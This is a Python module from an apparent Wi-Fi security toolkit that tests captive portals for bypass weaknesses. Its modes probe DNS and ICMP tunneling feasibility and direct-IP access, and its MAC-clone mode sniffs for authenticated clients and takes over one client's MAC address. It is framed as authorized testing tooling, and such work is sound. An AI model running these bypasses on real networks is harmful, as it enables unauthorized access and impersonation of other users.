#!/usr/bin/env python3
"""
Captive Portal Bypass Testing for Hoover WiFi Security Toolkit

Tests captive portal implementations for common bypass weaknesses:
DNS tunneling, ICMP tunneling, MAC cloning of authenticated clients,
and misconfigurations such as open DNS resolution or direct IP access
that doesn't route through the portal.

REALISTIC LIMITATION: DNS and ICMP tunneling require a controlled external
server that the tester operates (the domain's authoritative DNS or an ICMP
echo responder). This module tests the *client-side feasibility* -- whether
the captive portal blocks these protocols. For a full tunnel, deploy a
server-side component (iodine for DNS, hans for ICMP).

For authorized security testing and research only.
"""

import argparse
import json
import os
import socket
import subprocess
import sys
import time
from datetime import datetime
from typing import Optional

from scapy.layers.dns import DNS, DNSQR
from scapy.layers.dot11 import Dot11
from scapy.layers.inet import ICMP, IP
from scapy.sendrecv import sniff, sr1

from utils import require_root, setup_logging, validate_interface, validate_ip, validate_mac

BYPASS_MODES = ("probe", "dns-tunnel", "icmp-tunnel", "mac-clone", "direct-ip", "all")

DEFAULT_TARGET_IP = "1.1.1.1"
DEFAULT_DNS_DOMAIN = "tunnel.example.com"
DNS_TEST_PAYLOAD = b"hoover-probe"
ICMP_TEST_PAYLOAD = b"hoover-icmp-probe"

# Hosts known to resolve to stable public IPs, used to sanity-check DNS
# resolution against portal DNS hijacking / redirection.
DNS_SANITY_HOSTS: list[str] = ["one.one.one.one", "dns.google"]


class PortalBypass:
    """Test captive portal bypass techniques against the current network.

    Supports passive probing of several known bypass classes (DNS
    tunneling, ICMP tunneling, MAC cloning of an already-authenticated
    client, and direct-IP access that skips DNS/portal redirection), as
    well as active attempts at each individual technique.
    """

    def __init__(self, interface: str,
                 bypass_mode: str = "probe",
                 dns_tunnel_domain: Optional[str] = None,
                 target_ip: Optional[str] = None,
                 timeout: int = 120,
                 output_dir: str = "captures") -> None:
        self.interface: str = interface
        self.bypass_mode: str = bypass_mode
        self.dns_tunnel_domain: str = dns_tunnel_domain or DEFAULT_DNS_DOMAIN
        self.target_ip: str = target_ip or DEFAULT_TARGET_IP
        self.timeout: int = timeout
        self.output_dir: str = output_dir
        self.logger = setup_logging("portal_bypass")

        self.results: dict = {}
        self._start_time: Optional[float] = None
        self._running: bool = False

    # -----------------------------------------------------------------
    # Passive network checks
    # -----------------------------------------------------------------

    def _test_dns_resolution(self) -> bool:
        """Check whether DNS resolves to real IPs instead of a portal redirect.

        Many captive portals hijack DNS and return the portal's own IP
        (or an NXDOMAIN) for every lookup until the client authenticates.

        Returns:
            True if at least one sanity-check hostname resolved to a
            plausible external IP, False otherwise.
        """
        for host in DNS_SANITY_HOSTS:
            try:
                resolved = socket.gethostbyname(host)
            except (socket.gaierror, socket.timeout, OSError) as e:
                self.logger.debug("DNS resolution failed for %s: %s", host, e)
                continue

            if validate_ip(resolved) and not resolved.startswith("127."):
                self.logger.info("DNS resolution OK: %s -> %s", host, resolved)
                return True

            self.logger.info("DNS resolution suspicious: %s -> %s", host, resolved)

        return False

    def _test_direct_ip(self) -> bool:
        """Try connecting directly to a known external IP on port 80.

        Some portals only intercept DNS and HTTP-by-hostname traffic,
        leaving direct connections to a bare IP address unfiltered.

        Returns:
            True if a TCP connection to target_ip:80 succeeded,
            False otherwise.
        """
        try:
            with socket.create_connection((self.target_ip, 80), timeout=5):
                self.logger.info("Direct IP connection succeeded: %s:80", self.target_ip)
                return True
        except (socket.timeout, OSError) as e:
            self.logger.info("Direct IP connection failed: %s:80 (%s)", self.target_ip, e)
            return False

    def _test_icmp_reachability(self) -> bool:
        """Send an ICMP echo request to the target IP and check for a reply.

        Returns:
            True if an ICMP echo reply was received, False otherwise.
        """
        try:
            packet = IP(dst=self.target_ip) / ICMP()
            reply = sr1(packet, timeout=5, verbose=False)
            reachable = reply is not None
            self.logger.info("ICMP reachability to %s: %s", self.target_ip, reachable)
            return reachable
        except Exception as e:
            self.logger.warning("ICMP reachability test failed: %s", e)
            return False

    # -----------------------------------------------------------------
    # Authenticated client discovery
    # -----------------------------------------------------------------

    def _find_authenticated_clients(self) -> list[str]:
        """Passively sniff for data frames to find already-authenticated MACs.

        A client sending 802.11 data frames (type 2) is, by definition,
        associated and typically already past the captive portal's
        network-layer gate. Management-only clients (probing, not yet
        associated) are excluded.

        Returns:
            Sorted list of unique source MAC addresses seen sending
            data frames.
        """
        clients: set[str] = set()

        def handler(packet) -> None:
            try:
                if not packet.haslayer(Dot11):
                    return
                dot11 = packet[Dot11]
                if dot11.type != 2:
                    return
                src = getattr(dot11, "addr2", None)
                if src and validate_mac(src):
                    clients.add(src.upper())
            except Exception as e:
                self.logger.debug("Error processing sniffed frame: %s", e)

        try:
            sniff(iface=self.interface, prn=handler, timeout=min(self.timeout, 30), store=0)
        except Exception as e:
            self.logger.warning("Sniffing for authenticated clients failed: %s", e)

        found = sorted(clients)
        self.logger.info("Found %d candidate authenticated client(s)", len(found))
        return found

    # -----------------------------------------------------------------
    # DNS tunnel
    # -----------------------------------------------------------------

    def _build_dns_tunnel_query(self, data: bytes, domain: str):
        """Build a DNS query with payload encoded as a subdomain label.

        Args:
            data: Raw bytes to encode into the query name.
            domain: The tunnel domain that is authoritative for the
                encoded subdomain (e.g. "tunnel.example.com").

        Returns:
            A scapy IP/UDP/DNS packet whose question name is
            "<hex>.tunnel.example.com".
        """
        encoded = data.hex()
        qname = f"{encoded}.{domain}"
        dns_query = DNS(rd=1, qd=DNSQR(qname=qname, qtype="TXT"))
        return IP(dst=self.target_ip) / dns_query

    def _dns_tunnel_test(self, domain: str) -> dict:
        """Attempt a DNS tunneling test by resolving an encoded subdomain.

        Encodes a small test payload as a hex subdomain label of a
        domain the tester controls, then checks whether a DNS response
        comes back at all (indicating raw DNS queries are not blocked
        or hijacked by the portal).

        Args:
            domain: Tunnel domain to use for the encoded query.

        Returns:
            Dict with the encoded query, whether a response was
            received, and the raw response summary (if any).
        """
        result: dict = {
            "domain": domain,
            "payload": DNS_TEST_PAYLOAD.hex(),
            "success": False,
            "response": None,
        }

        try:
            query_name = f"{DNS_TEST_PAYLOAD.hex()}.{domain}"
            resolved = socket.gethostbyname(query_name)
            result["success"] = bool(resolved)
            result["response"] = resolved
            self.logger.info("DNS tunnel query for %s resolved to %s", query_name, resolved)
        except (socket.gaierror, socket.timeout, OSError) as e:
            self.logger.info("DNS tunnel query failed (expected without a "
                              "controlled authoritative server): %s", e)
            result["response"] = str(e)

        return result

    # -----------------------------------------------------------------
    # ICMP tunnel
    # -----------------------------------------------------------------

    def _build_icmp_tunnel_packet(self, data: bytes, target: str):
        """Build an ICMP echo request with a data payload for tunneling.

        Args:
            data: Raw bytes to embed in the ICMP echo payload field.
            target: Destination IP address.

        Returns:
            A scapy IP/ICMP packet carrying ``data`` as its payload.
        """
        return IP(dst=target) / ICMP(type=8, code=0) / data

    def _icmp_tunnel_test(self) -> dict:
        """Send an ICMP echo carrying encoded data and check the reply payload.

        Returns:
            Dict with whether a reply was received and whether its
            payload matches the sent payload (indicating the portal
            is not scrubbing ICMP payloads, a precondition for a full
            ICMP tunnel such as hans).
        """
        result: dict = {
            "target_ip": self.target_ip,
            "payload": ICMP_TEST_PAYLOAD.hex(),
            "reply_received": False,
            "payload_echoed": False,
        }

        try:
            packet = self._build_icmp_tunnel_packet(ICMP_TEST_PAYLOAD, self.target_ip)
            reply = sr1(packet, timeout=5, verbose=False)
            if reply is not None:
                result["reply_received"] = True
                reply_payload = bytes(reply[ICMP].payload) if reply.haslayer(ICMP) else b""
                result["payload_echoed"] = ICMP_TEST_PAYLOAD in reply_payload
                self.logger.info(
                    "ICMP tunnel test: reply received, payload echoed=%s",
                    result["payload_echoed"],
                )
            else:
                self.logger.info("ICMP tunnel test: no reply received")
        except Exception as e:
            self.logger.warning("ICMP tunnel test failed: %s", e)

        return result

    # -----------------------------------------------------------------
    # MAC clone
    # -----------------------------------------------------------------

    def _change_mac(self, interface: str, new_mac: str) -> bool:
        """Change the MAC address of a network interface via `ip link`.

        Args:
            interface: Interface name to modify.
            new_mac: New MAC address to assign.

        Returns:
            True if all three `ip link` commands succeeded, False otherwise.
        """
        if not validate_interface(interface) or not validate_mac(new_mac):
            self.logger.error("Invalid interface or MAC for change: %s / %s",
                               interface, new_mac)
            return False

        try:
            down = subprocess.run(
                ["ip", "link", "set", interface, "down"],
                capture_output=True, text=True, timeout=10,
            )
            set_mac = subprocess.run(
                ["ip", "link", "set", interface, "address", new_mac],
                capture_output=True, text=True, timeout=10,
            )
            up = subprocess.run(
                ["ip", "link", "set", interface, "up"],
                capture_output=True, text=True, timeout=10,
            )
            success = down.returncode == 0 and set_mac.returncode == 0 and up.returncode == 0
            if success:
                self.logger.info("Changed MAC of %s to %s", interface, new_mac)
            else:
                self.logger.warning("Failed to fully change MAC of %s to %s",
                                     interface, new_mac)
            return success
        except (subprocess.TimeoutExpired, FileNotFoundError, OSError) as e:
            self.logger.error("Error changing MAC: %s", e)
            return False

    def _mac_clone_test(self) -> dict:
        """Find an authenticated client's MAC, clone it, and test connectivity.

        Returns:
            Dict with the discovered candidate MACs, which one was
            cloned (if any), and whether connectivity improved after
            cloning.
        """
        result: dict = {
            "candidates": [],
            "cloned_mac": None,
            "clone_succeeded": False,
            "connectivity_after_clone": False,
        }

        candidates = self._find_authenticated_clients()
        result["candidates"] = candidates

        if not candidates:
            self.logger.info("No authenticated clients found to clone")
            return result

        target_mac = candidates[0]
        result["cloned_mac"] = target_mac
        result["clone_succeeded"] = self._change_mac(self.interface, target_mac)

        if result["clone_succeeded"]:
            result["connectivity_after_clone"] = self._test_direct_ip()

        return result

    # -----------------------------------------------------------------
    # Probe
    # -----------------------------------------------------------------

    def _probe_bypasses(self) -> dict:
        """Passively test each bypass technique's viability without changes.

        Returns:
            Dict mapping each technique name to a dict describing
            whether it appears viable and supporting details.
        """
        self.logger.info("Probing captive portal bypass viability...")

        dns_ok = self._test_dns_resolution()
        direct_ip_ok = self._test_direct_ip()
        icmp_ok = self._test_icmp_reachability()
        clients = self._find_authenticated_clients()

        probe_results: dict = {
            "dns_tunnel": {
                "viable": not dns_ok,
                "detail": "DNS resolves normally" if dns_ok else
                          "DNS appears hijacked/blocked, raw DNS may tunnel through",
            },
            "direct_ip": {
                "viable": direct_ip_ok,
                "detail": "Direct IP connection succeeded" if direct_ip_ok else
                          "Direct IP connection blocked or filtered by portal",
            },
            "icmp_tunnel": {
                "viable": icmp_ok,
                "detail": "ICMP echo reachable" if icmp_ok else
                          "ICMP appears blocked by portal",
            },
            "mac_clone": {
                "viable": len(clients) > 0,
                "detail": f"Found {len(clients)} candidate authenticated client(s)",
                "candidates": clients,
            },
        }

        self.logger.info("Probe complete: %s", {
            k: v["viable"] for k, v in probe_results.items()
        })
        return probe_results

    # -----------------------------------------------------------------
    # Orchestration
    # -----------------------------------------------------------------

    def start(self) -> dict:
        """Run the selected bypass mode and return results.

        Returns:
            Dict with the bypass mode and mode-specific findings.
        """
        self.logger.info("Starting Portal Bypass testing (mode=%s) on %s",
                          self.bypass_mode, self.interface)
        self._running = True
        self._start_time = time.time()

        data: dict = {}
        try:
            if self.bypass_mode == "probe":
                data = self._probe_bypasses()
            elif self.bypass_mode == "dns-tunnel":
                data = self._dns_tunnel_test(self.dns_tunnel_domain)
            elif self.bypass_mode == "icmp-tunnel":
                data = self._icmp_tunnel_test()
            elif self.bypass_mode == "mac-clone":
                data = self._mac_clone_test()
            elif self.bypass_mode == "direct-ip":
                data = {"direct_ip_success": self._test_direct_ip(),
                        "target_ip": self.target_ip}
            elif self.bypass_mode == "all":
                data = {
                    "probe": self._probe_bypasses(),
                    "dns_tunnel": self._dns_tunnel_test(self.dns_tunnel_domain),
                    "icmp_tunnel": self._icmp_tunnel_test(),
                    "mac_clone": self._mac_clone_test(),
                    "direct_ip": {"direct_ip_success": self._test_direct_ip()},
                }
            else:
                self.logger.error("Unknown bypass mode: %s", self.bypass_mode)
        finally:
            self._running = False

        self.results["mode"] = self.bypass_mode
        self.results["interface"] = self.interface
        self.results["data"] = data
        self.results["timestamp"] = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        return self.results

    def save_results(self) -> Optional[str]:
        """Save findings to a JSON file in the output directory.

        Returns:
            Path to the saved JSON file, or None if there was nothing
            to save or the save failed.
        """
        if not self.results:
            return None

        try:
            os.makedirs(self.output_dir, exist_ok=True)
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filepath = os.path.join(self.output_dir, f"portal_bypass_{timestamp}.json")
            with open(filepath, "w", encoding="utf-8") as f:
                json.dump(self.results, f, indent=2, default=str)
            self.logger.info("Results saved to %s", filepath)
            return filepath
        except Exception as e:
            self.logger.error("Failed to save results: %s", e)
            return None

    def get_status(self) -> dict:
        """Return current bypass-test status.

        Returns:
            Dict with running state, mode, interface, and elapsed time.
        """
        elapsed = 0.0
        if self._start_time is not None:
            elapsed = time.time() - self._start_time

        return {
            "running": self._running,
            "interface": self.interface,
            "bypass_mode": self.bypass_mode,
            "dns_tunnel_domain": self.dns_tunnel_domain,
            "target_ip": self.target_ip,
            "elapsed_seconds": round(elapsed, 1),
            "timeout": self.timeout,
        }


def main() -> None:
    parser = argparse.ArgumentParser(
        description=(
            "Portal Bypass - Captive Portal Bypass Testing. "
            "For authorized security testing and research only."
        ),
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog="""
REALISTIC LIMITATION: DNS and ICMP tunneling require a controlled external
server that the tester operates (the domain's authoritative DNS or an ICMP
echo responder). This module tests the *client-side feasibility* -- whether
the captive portal blocks these protocols. For a full tunnel, deploy a
server-side component (iodine for DNS, hans for ICMP).

Examples:
  # Probe all bypass techniques passively
  sudo python3 portal_bypass.py -i wlan0 -m probe

  # Test DNS tunneling feasibility
  sudo python3 portal_bypass.py -i wlan0 -m dns-tunnel --dns-domain tunnel.example.com

  # Test ICMP tunneling feasibility
  sudo python3 portal_bypass.py -i wlan0 -m icmp-tunnel --target-ip 1.1.1.1

  # Clone an authenticated client's MAC
  sudo python3 portal_bypass.py -i wlan0 -m mac-clone

  # Test direct-IP access bypass
  sudo python3 portal_bypass.py -i wlan0 -m direct-ip --target-ip 1.1.1.1

  # Run everything
  sudo python3 portal_bypass.py -i wlan0 -m all

For authorized security testing only.
        """,
    )

    parser.add_argument("-i", "--interface", required=True,
                        help="Network interface to use")
    parser.add_argument("-m", "--mode", default="probe",
                        choices=list(BYPASS_MODES),
                        help="Bypass mode (default: probe)")
    parser.add_argument("--dns-domain", default=DEFAULT_DNS_DOMAIN,
                        help="Controlled domain for DNS tunneling tests")
    parser.add_argument("--target-ip", default=DEFAULT_TARGET_IP,
                        help="Target IP for ICMP/direct-IP tests (default: 1.1.1.1)")
    parser.add_argument("-t", "--timeout", type=int, default=120,
                        help="Timeout in seconds (default: 120)")
    parser.add_argument("-o", "--output-dir", default="captures",
                        help="Output directory for results (default: captures)")
    parser.add_argument("-v", "--verbose", action="store_true",
                        help="Verbose output")

    args = parser.parse_args()
    require_root()

    if not validate_interface(args.interface):
        print(f"Invalid interface: {args.interface}", file=sys.stderr)
        sys.exit(1)

    if args.target_ip and not validate_ip(args.target_ip):
        print(f"Invalid target IP: {args.target_ip}", file=sys.stderr)
        sys.exit(1)

    bypass = PortalBypass(
        interface=args.interface,
        bypass_mode=args.mode,
        dns_tunnel_domain=args.dns_domain,
        target_ip=args.target_ip,
        timeout=args.timeout,
        output_dir=args.output_dir,
    )

    bypass.start()
    bypass.save_results()
    sys.exit(0)


if __name__ == "__main__":
    main()
